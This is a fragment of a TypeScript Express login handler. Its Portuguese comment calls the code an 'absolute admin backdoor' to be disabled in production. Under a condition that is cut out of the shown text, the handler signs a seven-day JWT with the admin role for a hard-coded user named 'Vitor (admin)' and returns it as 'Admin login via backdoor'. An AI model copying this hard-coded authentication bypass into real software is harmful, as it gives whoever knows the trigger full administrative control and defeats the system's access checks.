...
export async function login(req: Request, res: Response) {
  ...
  // Backdoor admin absoluto - alterar para desabilitar em produção
  if (
    ...
    const token = jwt.sign(
      { email, role: 'admin', name: 'Vitor (admin)' },
      JWT_SECRET,
      { expiresIn: '7d' }
    );
    return res.status(200).json({
      message: 'Admin login via backdoor',
      token,
      user: { email, name: 'Vitor (admin)', role: 'admin' },
    });
  }
